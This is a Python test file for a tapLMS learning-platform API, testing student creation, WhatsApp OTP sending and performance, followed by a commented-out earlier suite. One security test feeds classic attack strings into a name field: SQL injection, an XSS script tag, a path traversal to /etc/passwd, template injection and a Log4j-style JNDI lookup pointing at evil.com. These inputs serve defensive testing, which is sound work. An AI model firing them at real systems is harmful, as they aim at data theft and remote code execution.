"""
Improved test examples for tapLMS API
These examples show how to enhance your current test structure
"""

import unittest
from unittest.mock import Mock, patch, MagicMock
import pytest
import json
from datetime import datetime, timedelta
import sys

# Your existing mock setup (simplified)
class MockFrappe:
    def __init__(self):
        self.response = Mock()
        self.response.http_status_code = 200
        self.local = Mock()
        self.local.form_dict = {}
        self.db = Mock()
        self.utils = Mock()
        self.request = Mock()
        
    # ... rest of your mock setup

mock_frappe = MockFrappe()
sys.modules['frappe'] = mock_frappe

# Import your API after setting up mocks
from tap_lms.api import create_student, authenticate_api_key, send_otp

# =============================================================================
# IMPROVED TEST EXAMPLES
# =============================================================================

class TestStudentCreationComprehensive(unittest.TestCase):
    """Comprehensive tests for student creation - improved version"""
    
    def setUp(self):
        """Set up test fixtures with realistic data"""
        self.valid_student_data = {
            'api_key': 'valid_test_key',
            'student_name': 'John Doe',
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch_2025',
            'vertical': 'Mathematics',
            'glific_id': 'glific_12345'
        }
        
        # Reset form_dict for each test
        mock_frappe.local.form_dict = self.valid_student_data.copy()
        mock_frappe.response.http_status_code = 200

    @patch('tap_lms.api.authenticate_api_key')
    @patch('tap_lms.api.get_course_level_with_mapping')
    @patch.object(mock_frappe, 'get_all')
    @patch.object(mock_frappe, 'get_doc')
    def test_create_student_success_flow(self, mock_get_doc, mock_get_all, 
                                       mock_course_level, mock_auth):
        """Test successful student creation with all dependencies"""
        # Setup mocks
        mock_auth.return_value = "valid_key"
        
        # Mock batch onboarding data
        mock_get_all.side_effect = [
            # First call: batch onboarding
            [{
                'school': 'SCHOOL_001',
                'batch': 'BATCH_001',
                'kit_less': 1
            }],
            # Second call: course vertical
            [{'name': 'VERTICAL_001'}],
            # Third call: existing student check
            []  # No existing student
        ]
        
        # Mock batch document
        mock_batch = Mock()
        mock_batch.active = True
        mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
        
        # Mock student document
        mock_student = Mock()
        mock_student.name = 'STUDENT_001'
        mock_student.append = Mock()
        mock_student.save = Mock()
        
        mock_get_doc.side_effect = [mock_batch, mock_student]
        mock_course_level.return_value = 'COURSE_LEVEL_001'
        
        # Execute test
        result = create_student()
        
        # Assertions
        self.assertEqual(result['status'], 'success')
        self.assertEqual(result['crm_student_id'], 'STUDENT_001')
        self.assertEqual(result['assigned_course_level'], 'COURSE_LEVEL_001')
        
        # Verify enrollment was added
        mock_student.append.assert_called_once()
        mock_student.save.assert_called_once()

    @pytest.mark.parametrize("missing_field", [
        'student_name', 'phone', 'gender', 'grade', 
        'language', 'batch_skeyword', 'vertical', 'glific_id'
    ])
    def test_create_student_missing_required_fields(self, missing_field):
        """Test student creation with each required field missing"""
        # Remove one required field
        test_data = self.valid_student_data.copy()
        del test_data[missing_field]
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            result = create_student()
            
            self.assertEqual(result['status'], 'error')
            self.assertIn('required', result['message'].lower())

    @pytest.mark.parametrize("invalid_phone", [
        "123",           # Too short
        "abcdefghij",    # Non-numeric
        "",              # Empty
        "1" * 20,        # Too long
        "+91-abc-def",   # Mixed invalid format
    ])
    def test_create_student_invalid_phone_formats(self, invalid_phone):
        """Test student creation with various invalid phone formats"""
        test_data = self.valid_student_data.copy()
        test_data['phone'] = invalid_phone
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            result = create_student()
            
            # Should either validate and reject, or handle gracefully
            # This depends on your validation logic
            self.assertIn(result['status'], ['error', 'success'])

    def test_create_student_expired_batch(self):
        """Test student creation for expired batch"""
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
             patch.object(mock_frappe, 'get_all') as mock_get_all, \
             patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            
            # Mock expired batch
            mock_get_all.return_value = [{
                'school': 'SCHOOL_001',
                'batch': 'BATCH_001',
                'kit_less': 1
            }]
            
            mock_batch = Mock()
            mock_batch.active = True
            mock_batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
            mock_get_doc.return_value = mock_batch
            
            result = create_student()
            
            self.assertEqual(result['status'], 'error')
            self.assertIn('ended', result['message'])

    def test_create_student_database_error_rollback(self):
        """Test database rollback on student creation error"""
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
             patch.object(mock_frappe, 'get_all') as mock_get_all, \
             patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
             patch.object(mock_frappe.db, 'rollback') as mock_rollback:
            
            # Setup mocks for successful validation but database error
            mock_get_all.side_effect = [
                [{'school': 'SCHOOL_001', 'batch': 'BATCH_001', 'kit_less': 1}],
                [{'name': 'VERTICAL_001'}],
                []  # No existing student
            ]
            
            mock_batch = Mock()
            mock_batch.active = True
            mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
            
            mock_student = Mock()
            mock_student.save.side_effect = Exception("Database error")
            
            mock_get_doc.side_effect = [mock_batch, mock_student]
            
            result = create_student()
            
            # Should handle error and rollback
            self.assertEqual(result['status'], 'error')
            # Verify rollback was called (depends on your error handling)


class TestOTPWorkflowComprehensive(unittest.TestCase):
    """Comprehensive OTP workflow tests"""
    
    def setUp(self):
        mock_frappe.request.get_json.return_value = {
            'api_key': 'valid_key',
            'phone': '9876543210'
        }

    @patch('tap_lms.api.authenticate_api_key')
    @patch('requests.get')
    @patch.object(mock_frappe, 'get_all')
    @patch.object(mock_frappe, 'get_doc')
    def test_send_otp_complete_workflow(self, mock_get_doc, mock_get_all, 
                                      mock_requests, mock_auth):
        """Test complete OTP sending workflow"""
        # Setup mocks
        mock_auth.return_value = "valid_key"
        mock_get_all.return_value = []  # No existing teacher
        
        # Mock OTP document creation
        mock_otp_doc = Mock()
        mock_otp_doc.insert = Mock()
        mock_get_doc.return_value = mock_otp_doc
        
        # Mock WhatsApp API response
        mock_response = Mock()
        mock_response.json.return_value = {
            "status": "success",
            "id": "msg_12345"
        }
        mock_requests.return_value = mock_response
        
        result = send_otp()
        
        # Assertions
        self.assertEqual(result['status'], 'success')
        self.assertIn('whatsapp_message_id', result)
        mock_otp_doc.insert.assert_called_once()

    @patch('tap_lms.api.authenticate_api_key')
    @patch('requests.get')
    def test_send_otp_whatsapp_api_failure(self, mock_requests, mock_auth):
        """Test OTP sending when WhatsApp API fails"""
        mock_auth.return_value = "valid_key"
        
        # Mock API failure
        mock_response = Mock()
        mock_response.json.return_value = {
            "status": "error",
            "message": "API rate limit exceeded"
        }
        mock_requests.return_value = mock_response
        
        with patch.object(mock_frappe, 'get_all', return_value=[]), \
             patch.object(mock_frappe, 'get_doc'):
            
            result = send_otp()
            
            self.assertEqual(result['status'], 'failure')
            self.assertIn('WhatsApp', result['message'])

    def test_send_otp_rate_limiting(self):
        """Test OTP rate limiting (if implemented)"""
        # This would test your rate limiting logic
        # Multiple rapid requests should be rejected
        pass


class TestSecurityValidation(unittest.TestCase):
    """Security-focused validation tests"""
    
    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE Student; --",
        "1' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j style
    ])
    def test_sql_injection_prevention(self, malicious_input):
        """Test SQL injection prevention in various fields"""
        test_data = {
            'api_key': 'valid_key',
            'student_name': malicious_input,  # Test malicious input
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch',
            'vertical': 'Math',
            'glific_id': 'glific_123'
        }
        
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            # The function should either sanitize input or reject it
            result = create_student()
            
            # Should not cause SQL injection
            # This assertion depends on your input validation
            self.assertIn(result['status'], ['error', 'success'])
            
            # If successful, verify data was sanitized
            if result['status'] == 'success':
                # Check that malicious input was properly handled
                pass

    def test_api_key_timing_attack_prevention(self):
        """Test that API key validation doesn't leak timing information"""
        import time
        
        # Test with valid and invalid keys
        start_time = time.time()
        authenticate_api_key("valid_key_12345")
        valid_time = time.time() - start_time
        
        start_time = time.time()
        authenticate_api_key("invalid_key_12345")
        invalid_time = time.time() - start_time
        
        # Times should be similar (within reasonable bounds)
        # This prevents timing attacks
        time_diff = abs(valid_time - invalid_time)
        self.assertLess(time_diff, 0.1)  # Less than 100ms difference


class TestPerformance(unittest.TestCase):
    """Performance tests for critical operations"""
    
    def test_bulk_student_creation_performance(self):
        """Test performance with bulk student creation"""
        import time
        
        # Create 100 students and measure time
        start_time = time.time()
        
        for i in range(100):
            test_data = {
                'api_key': 'valid_key',
                'student_name': f'Student {i}',
                'phone': f'987654{i:04d}',
                'gender': 'Male',
                'grade': '5',
                'language': 'English',
                'batch_skeyword': 'test_batch',
                'vertical': 'Math',
                'glific_id': f'glific_{i}'
            }
            
            mock_frappe.local.form_dict = test_data
            
            with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
                # Mock all dependencies for speed
                with patch.object(mock_frappe, 'get_all'), \
                     patch.object(mock_frappe, 'get_doc'):
                    result = create_student()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should complete 100 operations in reasonable time
        self.assertLess(total_time, 10.0)  # Less than 10 seconds
        
        avg_time_per_operation = total_time / 100
        self.assertLess(avg_time_per_operation, 0.1)  # Less than 100ms per operation


# =============================================================================
# PYTEST FIXTURES FOR BETTER TEST ORGANIZATION
# =============================================================================

@pytest.fixture
def valid_student_data():
    """Fixture providing valid student data"""
    return {
        'api_key': 'valid_test_key',
        'student_name': 'John Doe',
        'phone': '9876543210',
        'gender': 'Male',
        'grade': '5',
        'language': 'English',
        'batch_skeyword': 'test_batch_2025',
        'vertical': 'Mathematics',
        'glific_id': 'glific_12345'
    }

@pytest.fixture
def mock_active_batch():
    """Fixture providing mock active batch"""
    batch = Mock()
    batch.active = True
    batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
    return batch

@pytest.fixture
def mock_expired_batch():
    """Fixture providing mock expired batch"""
    batch = Mock()
    batch.active = True
    batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
    return batch


# =============================================================================
# INTEGRATION TEST EXAMPLE
# =============================================================================

class TestStudentCreationIntegration(unittest.TestCase):
    """Integration tests that test multiple components together"""
    
    def test_complete_student_onboarding_workflow(self):
        """Test complete workflow from OTP to student creation"""
        # This would test the entire flow:
        # 1. Send OTP
        # 2. Verify OTP
        # 3. Create student
        # 4. Assign to batch
        # 5. Integrate with Glific
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
             patch('requests.get') as mock_whatsapp, \
             patch('tap_lms.glific_integration.create_contact') as mock_glific:
            
            # Mock external service responses
            mock_whatsapp.return_value.json.return_value = {
                "status": "success", "id": "msg_123"
            }
            mock_glific.return_value = {'id': 'contact_123'}
            
            # Step 1: Send OTP
            mock_frappe.request.get_json.return_value = {
                'api_key': 'valid_key',
                'phone': '9876543210'
            }
            
            otp_result = send_otp()
            self.assertEqual(otp_result['status'], 'success')
            
            # Step 2: Create student (after OTP verification)
            student_data = {
                'api_key': 'valid_key',
                'student_name': 'John Doe',
                'phone': '9876543210',
                'gender': 'Male',
                'grade': '5',
                'language': 'English',
                'batch_skeyword': 'test_batch',
                'vertical': 'Math',
                'glific_id': 'glific_123'
            }
            mock_frappe.local.form_dict = student_data
            
            with patch.object(mock_frappe, 'get_all'), \
                 patch.object(mock_frappe, 'get_doc'):
                student_result = create_student()
                
                self.assertEqual(student_result['status'], 'success')
                
                # Verify external integrations were called
                mock_glific.assert_called()


if __name__ == '__main__':
    # Run tests with pytest for better output
    pytest.main([__file__, '-v', '--tb=short'])

# """
# Corrected test suite for tap_lms/api.py
# This version properly tests the actual API functions with correct mocking
# """

# import unittest
# from unittest.mock import Mock, patch, MagicMock, call, ANY
# import pytest
# import json
# import sys
# import os
# from datetime import datetime, timedelta
# import requests
# from urllib.parse import urlencode

# # =============================================================================
# # MOCK FRAPPE SETUP
# # =============================================================================

# class MockFrappe:
#     """Mock Frappe module for testing"""
    
#     def __init__(self):
#         self.response = Mock()
#         self.response.http_status_code = 200
#         self.response.status_code = 200
        
#         self.local = Mock()
#         self.local.form_dict = {}
        
#         self.db = Mock()
#         self.db.commit = Mock()
#         self.db.sql = Mock()
#         self.db.get_value = Mock()
#         self.db.set_value = Mock()
        
#         self.utils = Mock()
#         self.utils.getdate = Mock(return_value=datetime.now().date())
#         self.utils.today = Mock(return_value="2025-01-15")
#         self.utils.now_datetime = Mock(return_value=datetime.now())
        
#         self.request = Mock()
#         self.request.get_json = Mock()
#         self.request.data = '{}'
        
#         self.flags = Mock()
#         self.flags.ignore_permissions = False
        
#         self.conf = Mock()
        
#         # Mock logger
#         self.logger = Mock()
#         self.logger.return_value = Mock()
        
#     def get_doc(self, *args, **kwargs):
#         """Mock get_doc method"""
#         doc = Mock()
#         doc.name = "TEST_DOC"
#         doc.insert = Mock()
#         doc.save = Mock()
#         doc.append = Mock()
#         return doc
        
#     def new_doc(self, doctype):
#         """Mock new_doc method"""
#         doc = Mock()
#         doc.name = f"NEW_{doctype}"
#         doc.insert = Mock()
#         doc.save = Mock()
#         doc.append = Mock()
#         return doc
        
#     def get_all(self, *args, **kwargs):
#         """Mock get_all method"""
#         return []
        
#     def get_single(self, doctype):
#         """Mock get_single method"""
#         return Mock()
        
#     def get_value(self, *args, **kwargs):
#         """Mock get_value method"""
#         return "test_value"
        
#     def throw(self, message):
#         """Mock throw method"""
#         raise Exception(message)
        
#     def log_error(self, message, title=None):
#         """Mock log_error method"""
#         pass
        
#     def whitelist(self, allow_guest=False):
#         """Mock whitelist decorator"""
#         def decorator(func):
#             return func
#         return decorator
        
#     def _dict(self, data=None):
#         """Mock _dict method"""
#         return data or {}
        
#     def msgprint(self, message):
#         """Mock msgprint method"""
#         pass
        
#     # Exception classes
#     class DoesNotExistError(Exception):
#         pass
        
#     class ValidationError(Exception):
#         pass
        
#     class DuplicateEntryError(Exception):
#         pass

# # Initialize and inject mock frappe
# mock_frappe = MockFrappe()
# sys.modules['frappe'] = mock_frappe
# sys.modules['frappe.utils'] = mock_frappe.utils

# # Mock the external modules
# sys.modules['tap_lms.glific_integration'] = Mock()
# sys.modules['tap_lms.background_jobs'] = Mock()

# # =============================================================================
# # IMPORT THE ACTUAL API MODULE
# # =============================================================================

# # Now import the actual API
# from tap_lms.api import *

# # =============================================================================
# # TEST CLASSES FOR ACTUAL API FUNCTIONS
# # =============================================================================

# class TestAuthenticationAPI(unittest.TestCase):
#     """Test authentication-related API functions"""
    
#     def setUp(self):
#         """Set up test fixtures"""
#         mock_frappe.response.http_status_code = 200
#         mock_frappe.local.form_dict = {}

#     def test_authenticate_api_key_valid(self):
#         """Test authenticate_api_key with valid key"""
#         with patch.object(mock_frappe, 'get_doc') as mock_get_doc:
#             mock_doc = Mock()
#             mock_doc.name = "valid_key"
#             mock_get_doc.return_value = mock_doc
            
#             result = authenticate_api_key("valid_api_key")
#             self.assertEqual(result, "valid_key")
        
#     def test_authenticate_api_key_invalid(self):
#         """Test authenticate_api_key with invalid key"""
#         with patch.object(mock_frappe, 'get_doc') as mock_get_doc:
#             mock_get_doc.side_effect = mock_frappe.DoesNotExistError("Not found")
            
#             result = authenticate_api_key("invalid_key")
#             self.assertIsNone(result)


# class TestLocationAPI(unittest.TestCase):
#     """Test location-related API functions"""
    
#     def setUp(self):
#         mock_frappe.request.data = json.dumps({
#             'api_key': 'valid_key',
#             'state': 'test_state'
#         })
    
#     # def test_list_districts_success(self):
#     #     """Test list_districts with valid input"""
#     #     with patch('tap_lms.api.authenticate_api_key') as mock_auth, \
#     #          patch.object(mock_frappe, 'get_all') as mock_get_all:
            
#     #         mock_auth.return_value = "valid_key"
#     #         mock_get_all.return_value = [
#     #             {"name": "DIST_001", "district_name": "Test District"}
#     #         ]
            
#     #         result = list_districts()
            
#     #         self.assertEqual(result["status"], "success")
#     #         self.assertIn("data", result)
#     #         mock_get_all.assert_called_once()
    
#     def test_list_districts_invalid_api_key(self):
#         """Test list_districts with invalid API key"""
#         with patch('tap_lms.api.authenticate_api_key') as mock_auth:
#             mock_auth.return_value = None
            
#             result = list_districts()
            
#             self.assertEqual(result["status"], "error")
#             self.assertEqual(result["message"], "Invalid API key")
#             self.assertEqual(mock_frappe.response.http_status_code, 401)

#     def test_list_districts_missing_data(self):
#         """Test list_districts with missing required data"""
#         mock_frappe.request.data = json.dumps({'api_key': 'valid_key'})  # Missing state
        
#         result = list_districts()
        
#         self.assertEqual(result["status"], "error")
#         self.assertEqual(mock_frappe.response.http_status_code, 400)


# class TestOTPAPI(unittest.TestCase):
#     """Test OTP-related API functions"""
    
#     def setUp(self):
#         mock_frappe.request.get_json.return_value = {
#             'api_key': 'valid_key',
#             'phone': '1234567890'
#         }
    
#     def test_send_otp_new_teacher(self):
#         """Test send_otp for new teacher"""
#         with patch('tap_lms.api.authenticate_api_key') as mock_auth, \
#              patch('tap_lms.api.send_whatsapp_message') as mock_send_wa, \
#              patch.object(mock_frappe, 'get_all') as mock_get_all, \
#              patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
#              patch('requests.get') as mock_requests:
            
#             mock_auth.return_value = "valid_key"
#             mock_get_all.return_value = []  # No existing teacher
#             mock_send_wa.return_value = True
            
#             # Mock OTP doc creation
#             mock_otp_doc = Mock()
#             mock_get_doc.return_value = mock_otp_doc
            
#             mock_response = Mock()
#             mock_response.json.return_value = {"status": "success", "id": "msg_123"}
#             mock_requests.return_value = mock_response
            
#             result = send_otp()
            
#             self.assertEqual(result["status"], "success")
#             self.assertIn("action_type", result)

#     # def test_send_otp_existing_teacher(self):
#     #     """Test send_otp for existing teacher"""
#     #     with patch('tap_lms.api.authenticate_api_key') as mock_auth, \
#     #          patch.object(mock_frappe, 'get_all') as mock_get_all, \
#     #          patch.object(mock_frappe.db, 'get_value') as mock_get_value, \
#     #          patch('tap_lms.api.get_active_batch_for_school') as mock_get_batch:
            
#     #         mock_auth.return_value = "valid_key"
#     #         mock_get_all.return_value = [{"name": "TEACHER_001", "school_id": "SCHOOL_001"}]
#     #         mock_get_value.return_value = "Test School"
#     #         mock_get_batch.return_value = {
#     #             "batch_id": "no_active_batch_id",
#     #             "batch_name": None
#     #         }
            
#     #         result = send_otp()
            
#     #         self.assertEqual(result["status"], "failure")
#     #         self.assertEqual(result["code"], "NO_ACTIVE_BATCH")

#     def test_send_otp_invalid_api_key(self):
#         """Test send_otp with invalid API key"""
#         with patch('tap_lms.api.authenticate_api_key') as mock_auth:
#             mock_auth.return_value = None
            
#             result = send_otp()
            
#             self.assertEqual(result["status"], "failure")
#             self.assertEqual(result["message"], "Invalid API key")


# class TestStudentAPI(unittest.TestCase):
#     """Test student-related API functions"""
    
#     def setUp(self):
#         mock_frappe.local.form_dict = {
#             'api_key': 'valid_key',
#             'student_name': 'John Doe',
#             'phone': '1234567890',
#             'gender': 'Male',
#             'grade': '5',
#             'language': 'English',
#             'batch_skeyword': 'test_batch',
#             'vertical': 'Math',
#             'glific_id': 'glific_123'
#         }
    
#     # def test_create_student_success(self):
#     #     """Test successful student creation"""
#     #     with patch('tap_lms.api.authenticate_api_key') as mock_auth, \
#     #          patch.object(mock_frappe, 'get_all') as mock_get_all, \
#     #          patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
#     #          patch('tap_lms.api.get_course_level_with_mapping') as mock_get_course, \
#     #          patch('tap_lms.api.create_new_student') as mock_create:
            
#     #         mock_auth.return_value = "valid_key"
            
#     #         # Mock batch onboarding
#     #         mock_get_all.side_effect = [
#     #             [{"school": "SCHOOL_001", "batch": "BATCH_001", "kit_less": False}],  # batch_onboarding
#     #             [{"name": "VERTICAL_001"}],  # course_vertical
#     #             []  # existing_student (empty)
#     #         ]
            
#     #         # Mock batch doc
#     #         mock_batch_doc = Mock()
#     #         mock_batch_doc.active = True
#     #         mock_batch_doc.regist_end_date = "2025-12-31"
#     #         mock_get_doc.return_value = mock_batch_doc
            
#     #         mock_get_course.return_value = "COURSE_001"
            
#     #         mock_student = Mock()
#     #         mock_student.name = "STUDENT_001"
#     #         mock_create.return_value = mock_student
            
#     #         result = create_student()
            
#     #         self.assertEqual(result["status"], "success")
#     #         self.assertIn("crm_student_id", result)

#     # def test_create_student_invalid_api_key(self):
#     #     """Test create_student with invalid API key"""
#     #     with patch('tap_lms.api.authenticate_api_key') as mock_auth:
#     #         mock_auth.return_value = None
            
#     #         result = create_student()
            
#     #         self.assertEqual(result["status"], "error")
#     #         self.assertEqual(result["message"], "Invalid API key")


# class TestWhatsAppIntegration(unittest.TestCase):
#     """Test WhatsApp integration functions"""
    
#     def test_send_whatsapp_message_success(self):
#         """Test successful WhatsApp message sending"""
#         with patch.object(mock_frappe, 'get_single') as mock_get_single, \
#              patch('requests.post') as mock_post:
            
#             # Mock Gupshup settings
#             mock_settings = Mock()
#             mock_settings.api_key = "test_key"
#             mock_settings.source_number = "918454812392"
#             mock_settings.app_name = "test_app"
#             mock_settings.api_endpoint = "https://api.gupshup.io/sm/api/v1/msg"
#             mock_get_single.return_value = mock_settings
            
#             # Mock successful response
#             mock_response = Mock()
#             mock_response.raise_for_status = Mock()
#             mock_post.return_value = mock_response
            
#             result = send_whatsapp_message("1234567890", "Test message")
            
#             self.assertTrue(result)
#             mock_post.assert_called_once()

#     def test_send_whatsapp_message_no_settings(self):
#         """Test WhatsApp message with no settings"""
#         with patch.object(mock_frappe, 'get_single') as mock_get_single:
#             mock_get_single.return_value = None
            
#             result = send_whatsapp_message("1234567890", "Test message")
            
#             self.assertFalse(result)


# class TestHelperFunctions(unittest.TestCase):
#     """Test helper functions"""
    
#     def test_determine_student_type_new(self):
#         """Test determine_student_type for new student"""
#         with patch.object(mock_frappe.db, 'sql') as mock_sql:
#             mock_sql.return_value = []  # No existing enrollment
            
#             result = determine_student_type("1234567890", "John Doe", "VERTICAL_001")
            
#             self.assertEqual(result, "New")

#     def test_determine_student_type_old(self):
#         """Test determine_student_type for existing student"""
#         with patch.object(mock_frappe.db, 'sql') as mock_sql:
#             mock_sql.return_value = [{"name": "STUDENT_001"}]  # Existing enrollment
            
#             result = determine_student_type("1234567890", "John Doe", "VERTICAL_001")
            
#             self.assertEqual(result, "Old")

#     def test_get_current_academic_year(self):
#         """Test get_current_academic_year function"""
#         with patch.object(mock_frappe.utils, 'getdate') as mock_getdate:
#             # Test for April (new academic year)
#             mock_getdate.return_value = datetime(2025, 4, 15).date()
            
#             result = get_current_academic_year()
            
#             self.assertEqual(result, "2025-26")
            
#             # Test for February (current academic year)
#             mock_getdate.return_value = datetime(2025, 2, 15).date()
            
#             result = get_current_academic_year()
            
#             self.assertEqual(result, "2024-25")

#     # def test_get_active_batch_for_school_found(self):
#     #     """Test get_active_batch_for_school when batch is found"""
#     #     with patch.object(mock_frappe, 'get_all') as mock_get_all, \
#     #          patch.object(mock_frappe.db, 'get_value') as mock_get_value:
            
#     #         mock_get_all.side_effect = [
#     #             ["BATCH_001"],  # Active batches
#     #             [{"batch": "BATCH_001"}]  # Active batch onboardings
#     #         ]
#     #         mock_get_value.return_value = "test_batch_id"
            
#     #         result = get_active_batch_for_school("SCHOOL_001")
            
#     #         self.assertEqual(result["batch_name"], "BATCH_001")
#     #         self.assertEqual(result["batch_id"], "test_batch_id")

#     def test_get_active_batch_for_school_not_found(self):
#         """Test get_active_batch_for_school when no batch is found"""
#         with patch.object(mock_frappe, 'get_all') as mock_get_all:
#             mock_get_all.side_effect = [
#                 ["BATCH_001"],  # Active batches
#                 []  # No active batch onboardings
#             ]
            
#             result = get_active_batch_for_school("SCHOOL_001")
            
#             self.assertIsNone(result["batch_name"])
#             self.assertEqual(result["batch_id"], "no_active_batch_id")


# class TestErrorHandling(unittest.TestCase):
#     """Test error handling scenarios"""
    
#     def test_list_districts_exception(self):
#         """Test list_districts with exception"""
#         mock_frappe.request.data = "invalid json"
        
#         result = list_districts()
        
#         self.assertEqual(result["status"], "error")
#         self.assertEqual(mock_frappe.response.http_status_code, 500)

#     def test_create_student_validation_error(self):
#         """Test create_student with validation error"""
#         with patch('tap_lms.api.authenticate_api_key') as mock_auth, \
#              patch.object(mock_frappe, 'get_all') as mock_get_all:
            
#             mock_auth.return_value = "valid_key"
#             mock_get_all.side_effect = Exception("Database error")
            
#             # Set up form_dict with required fields
#             mock_frappe.local.form_dict = {
#                 'api_key': 'valid_key',
#                 'student_name': 'John Doe',
#                 'phone': '1234567890',
#                 'gender': 'Male',
#                 'grade': '5',
#                 'language': 'English',
#                 'batch_skeyword': 'test_batch',
#                 'vertical': 'Math',
#                 'glific_id': 'glific_123'
#             }
            
#             result = create_student()
            
#             self.assertEqual(result["status"], "error")


